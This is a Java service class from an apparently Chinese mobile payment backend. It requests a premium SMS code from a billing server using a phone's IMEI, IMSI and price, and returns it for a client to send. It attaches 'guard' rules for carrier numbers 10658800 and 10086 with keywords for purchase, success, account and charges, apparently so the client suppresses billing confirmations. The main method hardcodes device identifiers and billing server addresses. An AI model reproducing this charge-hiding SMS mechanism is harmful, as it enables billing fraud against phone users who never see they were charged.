package com.jxt.pay.appclient.service.dynamic.net;

import java.util.ArrayList;
import java.util.Calendar;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

import org.apache.log4j.Logger;
import org.json.JSONObject;

import com.jxt.pay.appclient.service.dynamic.pojo.Guard;
import com.jxt.pay.appclient.service.dynamic.pojo.Sms;
import com.jxt.pay.appclient.service.dynamic.utils.XstreamHelper;
import com.jxt.pay.appclient.utils.Constants;
import com.jxt.pay.appclient.utils.DynamicUtils;
import com.jxt.pay.appclient.utils.GetData;
import com.jxt.pay.handler.PassageHandler;
import com.jxt.pay.pojo.Passage;
import com.qlzf.commons.helper.MD5Encrypt;

/**
 * tradeid=@@83004************
**************自定义流水号,不可重复, 
@@表示省份编码, 如不需分省可直接设定01
 * @author leoliu
 *
 */
public class BjjsMm4DynamicService implements IDynamicService{
	
	private static final Logger logger = Logger.getLogger(BjjsMm4DynamicService.class);

	private static final String TYPE = "bjjsMm4";
	
	private static final Integer DEFAULTSUCCESSTIMEOUT = 2;
	
	private static final String REQUESTMODEL = "pid={pid}&imsi={imsi}&imei={imei}&price={price}&tradeid={tradeid}";
	
	private static final Guard guard1 = new Guard("10658800","成功|购买",2880,"1",0);
	private static final Guard guard2 = new Guard("10086","点数|帐户|充值|花费",2880,null,1);
	private static final Guard guard3 = new Guard("10658800","",960,null,1);
	private static final Guard guard4 = new Guard("10086","",960,null,1);
	
	@Override
	public String getType() {
		return TYPE;
	}

	private Map<String, Long> tryMap = new HashMap<String, Long>();

	private int timeOut = 60;
	
	@Override
	public String dynamic(Map<String, String> map) {
		
		String xml = null;
		String url = map.get("url");
		
		if(url != null && url.length() > 0){
			String channel = map.get("channel");
			
			Calendar cal = Calendar.getInstance();
			Long startTime = tryMap.get(channel);
			
			if(startTime == null){
				startTime = cal.getTimeInMillis();
				tryMap.put(channel,startTime);
			}else{
				if(cal.getTimeInMillis() - startTime >= 1000 * timeOut){
					tryMap.remove(channel);
					return DynamicUtils.parseError("599");
				}
			}
			
			String pid = map.get("pid");
			String price = map.get("price");
			String imei = map.get("imei");
			String imsi = map.get("imsi");
			String tradeid = map.get("tradeid");
			String province = map.get("province");
			
			if(province != null && province.length() > 0){
				province = proMap.get(province);
				if(province != null && province.length() > 0){
					tradeid = province+tradeid.substring(province.length());
				}
			}
			
			tradeid = tradeid + channel;
			
			String param = REQUESTMODEL.replace("{pid}",pid).replace("{price}",price).replace("{imei}",imei).replace("{imsi}",imsi).replace("{tradeid}",tradeid);
			
			String responseTxt = GetData.getData(url, param);
			
			xml = parse(responseTxt,map);

			if(xml == null || xml.length() == 0){
				xml = DynamicUtils.parseWait(10,map);
			}else{
				tryMap.remove(channel);
			}
		}
		
		return xml;
	}
	
	/**
	 * SUCCESS<:>1065842410<:>a3#1NM6J#1DOH6AI#4J21NE6JMA#8UIZPHV5JM#25B6X2#AMU6U6V5M#3375EBD11AC229DE#37989C957A104EF4#309E41595371C33A#5678901474656532<:>829<:>4<:>5<:end> 
	 * @param responseJson
	 * @return
	 */
	private String parse(String responseTxt,Map<String,String> map){
		
		if(responseTxt != null && responseTxt.length() > 0){
			if(responseTxt.startsWith("SUCCESS")){
				try{
					String[] arr = responseTxt.split("<:>");
					
					if(arr.length >= 3){
						List<Sms> smsList = new ArrayList<Sms>();
						
						Sms sms = new Sms();
						
						sms.setSmsContent(arr[2]);
						sms.setSmsDest(arr[1]);
						sms.setSuccessTimeOut(DEFAULTSUCCESSTIMEOUT);
						
						smsList.add(sms);
						
						Sms guardSms = new Sms();
						
						List<Guard> guardList = new ArrayList<Guard>();
						
						guardList.add(guard1);
						guardList.add(guard2);
						
						guardList.add(guard3);
						guardList.add(guard4);
						
						guardSms.setGuardList(guardList);
						
						smsList.add(0, guardSms);
							
						return XstreamHelper.toXml(smsList);
					}
				}catch(Exception e){
					
				}
			}else if(responseTxt.startsWith("ERROR")){//到量或者下线
				if(responseTxt.contains("param error2") || responseTxt.contains("incoming")){
					logger.info("error msg : "+responseTxt);
					try{
						String pid = map.get("passageId");
						
						if(pid != null && pid.length() > 0){
							Passage passage = new Passage();
							passage.setId(Long.parseLong(pid));
							passage.setStatus(0);
							
							passageHandler.update(passage);
						}
					
					}catch(Exception e){
						
					}
				}
			}
		}
		
		return null;
	}
	
private static Map<String, String> proMap = new HashMap<String, String>();
	
	/**
	 * 01 安徽    02 北京  03 福建  04 甘肃  05 广东  06 广西  07 贵州  08 海南  09 河北  10 河南  11 黑龙江		
		12 湖北  13 湖南 14 吉林 15 江苏 16 江西 17 辽宁 18 内蒙古 19 宁夏 20 青海 21 山东 22 山西
		23 陕西 24 上海 25 四川 26 天津 27 西藏 28 新疆 29 云南 30 浙江 31 重庆
	 * 
	 */
	
	static{
		proMap.put("8611", "02");
		proMap.put("8612", "26");
		proMap.put("8613", "09");
		proMap.put("8614", "22");
		proMap.put("8615", "18");
		proMap.put("8621", "17");
		proMap.put("8622", "14");
		proMap.put("8623", "11");
		proMap.put("8631", "24");
		proMap.put("8632", "15");
		proMap.put("8633", "30");
		proMap.put("8634", "01");
		proMap.put("8635", "03");
		proMap.put("8636", "16");
		proMap.put("8637", "21");
		proMap.put("8641", "10");
		proMap.put("8642", "12");
		proMap.put("8643", "13");
		proMap.put("8644", "05");
		proMap.put("8645", "06");
		proMap.put("8646", "08");
		proMap.put("8650", "31");
		proMap.put("8651", "25");
		proMap.put("8652", "07");
		proMap.put("8653", "29");
		proMap.put("8654", "27");
		proMap.put("8661", "23");
		proMap.put("8662", "04");
		proMap.put("8663", "20");
		proMap.put("8664", "19");
		proMap.put("8665", "28");
	}
	
	public static void main(String[] args){
		//http://211.154.162.11/recYdmmAction.action?companycode=W1001&pid=ttddz20c&statement=W100120140529174&imsi=460021281243687&imei=863388028868466&mobileip=202.108.36.125&sign=F0B9CB8094C477E328043EBBB9787362
		
		String url = "http://218.16.118.218:9007/zhangyunbilling/MMmessage";
		
		Map<String, String> map = new HashMap<String, String>();
		
		map.put("url", url);
		map.put("channel", "10B101a087654321");
		map.put("imei", "862949029214504");
		map.put("imsi", "460022101441340");
		map.put("pid", "83901");
		map.put("price","6.00");
		map.put("tradeid","018390104");
		map.put("province", "8611");
		map.put("type", "bjjsMm4");

		
		System.out.println(new BjjsMm4DynamicService().dynamic(map));
	}

	//ioc
	private PassageHandler passageHandler;

	public void setPassageHandler(PassageHandler passageHandler) {
		this.passageHandler = passageHandler;
	}
	
	
}
